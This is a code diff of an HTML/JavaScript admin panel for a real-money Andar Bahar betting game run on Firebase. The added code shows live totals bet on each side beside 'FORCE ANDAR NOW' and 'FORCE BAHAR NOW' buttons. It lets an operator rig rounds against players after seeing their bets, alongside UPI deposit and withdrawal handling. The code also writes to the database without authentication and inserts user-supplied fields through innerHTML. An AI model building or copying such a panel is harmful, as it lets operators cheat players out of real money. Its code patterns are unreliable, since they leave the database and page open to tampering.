@@ -3,55 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Master Control Admin Panel</title>
+    <title>Master Control Hub</title>
     <style>
-        body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .box { max-width: 500px; margin: 0 auto; background: #1e293b; padding: 20px; border-radius: 15px; border: 1px solid #334155; }
-        button { padding: 12px 24px; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; margin: 8px; font-size: 14px; text-transform: uppercase; }
+        body { background: #0f172a; color: white; font-family: sans-serif; padding: 15px; margin: 0; }
+        .box { max-width: 600px; margin: 0 auto; background: #1e293b; padding: 15px; border-radius: 15px; border: 1px solid #334155; }
+        button { padding: 10px 15px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; margin: 4px; text-transform: uppercase; }
         .btn-auto { background: #64748b; color: white; }
-        .btn-andar { background: #2563eb; color: white; }
-        .btn-bahar { background: #d97706; color: white; }
-        .status-box { background: #020617; padding: 10px; border-radius: 8px; margin: 15px 0; font-size: 15px; color: #38bdf8; }
+        .btn-andar { background: #2563eb; color: white; border: 2px solid #60a5fa; }
+        .btn-bahar { background: #d97706; color: white; border: 2px solid #fbbf24; }
+        .btn-approve { background: #10b981; color: white; font-size: 11px; }
+        .btn-reject { background: #ef4444; color: white; font-size: 11px; }
+        .status-box { background: #020617; padding: 10px; border-radius: 8px; margin: 10px 0; color: #38bdf8; font-size: 14px; }
+        .table-section { background: #0b132b; padding: 10px; border-radius: 8px; margin-top: 15px; text-align: left; border: 1px solid #1e293b; }
+        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; }
+        table { width: 100%; border-collapse: collapse; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <h2>🎛️ SYSTEM CONTROLLER PANEL</h2>
-    <p style="color: #94a3b8;">Set Next Winner Command Forcefully</p>
     
     <div class="status-box">
-        Current Mode/Target: <strong id="currTarget">LOADING...</strong>
+        Active Force Mode: <strong id="currTarget" style="font-size:16px; color:#ffbc00;">LOADING...</strong>
+        <br><span style="color:#cbd5e1; font-size:12px; display:block; margin-top:5px;">Live Round Bets -> Andar: <span id="totAndarBet" style="color:#60a5fa; font-weight:bold;">0</span> | Bahar: <span id="totBaharBet" style="color:#fbbf24; font-weight:bold;">0</span></span>
     </div>
 
     <div>
-        <button class="btn-andar" onclick="setForce('andar')">FORCE ANDAR WINS</button>
-        <button class="btn-bahar" onclick="setForce('bahar')">FORCE BAHAR WINS</button>
-        <br>
-        <button class="btn-auto" onclick="setForce('auto')" style="width: 94%;">RESET TO AUTOMATIC MODE</button>
+        <button class="btn-andar" style="width:47%;" onclick="setForce('andar')">📢 FORCE ANDAR NOW</button>
+        <button class="btn-bahar" style="width:47%;" onclick="setForce('bahar')">📢 FORCE BAHAR NOW</button>
+        <button class="btn-auto" onclick="setForce('auto')" style="width: 96%; margin-top:8px;">♻️ RESET TO AUTO MODE</button>
+    </div>
+
+    <div class="table-section">
+        <h4 style="margin:5px 0; color:#00f5d4;">✍️ UPDATE LIVE UPI GATEWAY</h4>
+        <input type="text" id="newUpiInput" placeholder="Enter new UPI ID" style="width:65%; padding:8px; background:#020617; color:white; border:1px solid #334155; border-radius:5px;">
+        <button onclick="changeUpiId()" style="background:#3b82f6; color:white; padding:8px 12px; margin-left:5px;">UPDATE ID</button>
+    </div>
+
+    <div class="table-section">
+        <h4 style="margin:5px 0; color:#38bdf8;">📥 DEPOSIT REQUESTS (VERIFICATION)</h4>
+        <table>
+            <thead><tr><th>Player</th><th>Coins</th><th>UTR No</th><th>Actions</th></tr></thead>
+            <tbody id="depositBody"><tr><td colspan="4">No Pending Requests</td></tr></tbody>
+        </table>
+    </div>
+
+    <div class="table-section">
+        <h4 style="margin:5px 0; color:#ff5c5c;">📤 WITHDRAWAL REQUESTS</h4>
+        <table>
+            <thead><tr><th>Player</th><th>Coins</th><th>UPI ID</th><th>Actions</th></tr></thead>
+            <tbody id="withdrawBody"><tr><td colspan="4">No Pending Requests</td></tr></tbody>
+        </table>
     </div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-    import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+    import { getDatabase, ref, set, update, onValue, remove } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
-    // SYNCED WITH REAL DATABASE URL
-    const firebaseConfig = {
-        databaseURL: "https://my-first-app-cad29-default-rtdb.firebaseio.com"
-    };
-
+    const firebaseConfig = { databaseURL: "https://my-first-app-cad29-default-rtdb.firebaseio.com" };
     const app = initializeApp(firebaseConfig);
     const database = getDatabase(app);
 
     onValue(ref(database, "game/forcedWinner"), (snapshot) => {
-        let val = snapshot.exists() ? snapshot.val().toUpperCase() : "AUTO";
-        document.getElementById("currTarget").innerText = val;
+        document.getElementById("currTarget").innerText = snapshot.exists() ? snapshot.val().toUpperCase() : "AUTO";
     });
 
-    window.setForce = function(mode) {
-        set(ref(database, "game/forcedWinner"), mode);
-        alert("Command Sent: Target updated to " + mode.toUpperCase());
+    onValue(ref(database, "players"), (snapshot) => {
+        let tAndar = 0; let tBahar = 0;
+        if(snapshot.exists()) {
+            Object.values(snapshot.val()).forEach(p => {
+                if(p.currentBet) {
+                    if(p.currentBet.side === "andar") tAndar += parseInt(p.currentBet.amount) || 0;
+                    if(p.currentBet.side === "bahar") tBahar += parseInt(p.currentBet.amount) || 0;
+                }
+            });
+        }
+        document.getElementById("totAndarBet").innerText = tAndar;
+        document.getElementById("totBaharBet").innerText = tBahar;
+    });
+
+    onValue(ref(database, "requests/deposits"), (snapshot) => {
+        let html = "";
+        if(snapshot.exists()) {
+            Object.entries(snapshot.val()).forEach(([key, req]) => {
+                html += `<tr><td>${req.userId}</td><td>${req.amount}</td><td>${req.utr}</td>
+                <td><button class="btn-approve" onclick="manageDep('${key}','${req.userId}',${req.amount},'approve')">✅ Approve</button>
+                <button class="btn-reject" onclick="manageDep('${key}','${req.userId}',${req.amount},'reject')">❌ Reject</button></td></tr>`;
+            });
+            document.getElementById("depositBody").innerHTML = html;
+        } else { document.getElementById("depositBody").innerHTML = "<tr><td colspan='4'>No Pending Requests</td></tr>"; }
+    });
+
+    onValue(ref(database, "requests/withdraws"), (snapshot) => {
+        let html = "";
+        if(snapshot.exists()) {
+            Object.entries(snapshot.val()).forEach(([key, req]) => {
+                html += `<tr><td>${req.userId}</td><td>${req.amount}</td><td>${req.upiId}</td>
+                <td><button class="btn-approve" onclick="manageWit('${key}','approve')">Clear</button>
+                <button class="btn-reject" onclick="manageWit('${key}','reject','${req.userId}',${req.amount})">Reject</button></td></tr>`;
+            });
+            document.getElementById("withdrawBody").innerHTML = html;
+        } else { document.getElementById("withdrawBody").innerHTML = "<tr><td colspan='4'>No Pending Requests</td></tr>"; }
+    });
+
+    window.setForce = function(mode) { set(ref(database, "game/forcedWinner"), mode); }
+    
+    window.changeUpiId = function() {
+        let upi = document.getElementById("newUpiInput").value.trim();
+        if(upi.length > 3) { set(ref(database, "system/config"), { upi: upi }); alert("UPI Updated!"); }
+    }
+
+    window.manageDep = function(key, uid, amt, type) {
+        if(type === "approve") {
+            onValue(ref(database, `players/${uid}/coins`), (snap) => {
+                let currentCoins = snap.exists() ? parseInt(snap.val()) : 0;
+                update(ref(database, `players/${uid}`), { coins: currentCoins + amt });
+            }, { onlyOnce: true });
+        }
+        remove(ref(database, `requests/deposits/${key}`));
+    }
+
+    window.manageWit = function(key, type, uid, amt) {
+        if(type === "reject") {
+            onValue(ref(database, `players/${uid}/coins`), (snap) => {
+                let currentCoins = snap.exists() ? parseInt(snap.val()) : 0;
+                update(ref(database, `players/${uid}`), { coins: currentCoins + amt });
+            }, { onlyOnce: true });
+        }
+        remove(ref(database, `requests/withdraws/${key}`));
     }
 </script>
 </body>
